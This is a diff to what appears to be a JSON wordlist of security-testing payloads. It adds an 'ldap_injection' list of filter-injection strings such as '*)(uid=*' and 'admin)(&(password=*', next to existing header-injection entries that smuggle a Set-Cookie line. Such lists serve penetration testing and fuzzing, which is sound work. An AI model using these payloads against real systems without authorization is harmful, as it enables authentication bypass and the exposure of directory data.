@@ -134,7 +134,30 @@
       "\\nSet-Cookie: admin=true",
       ";Content-Length: 0",
       ",Content-Length: 0"
-    ]
+    ],
+   "ldap_injection": [
+     "*",
+     "*)(uid=*",
+     "*((uid=*",
+     "admin*",
+     "*)(objectClass=*",
+     "admin)(&(password=*",
+     "*((uid=admin",
+     "*)(&(objectClass=*",
+     "admin)(&(uid=*",
+     "*)(uid=admin)(|(uid=*))",
+
+     "*)()",
+     "*)(cn=*)",
+     "*)(|(cn=admin))",
+     "*)(&(cn=*)(sn=*))",
+     "*)(|(objectClass=person))",
+     "*)(&(uid=*)(cn=admin*))",
+     "*)(|(uid=*)(!(uid=*)))",
+     "*)(&(mail=*)(uid=*))",
+     "*)(|(samAccountName=*))",
+     "*)(&(objectCategory=person)(cn=*))"
+  ]
   },
   "notes": [
     "Use these strings for security testing only",
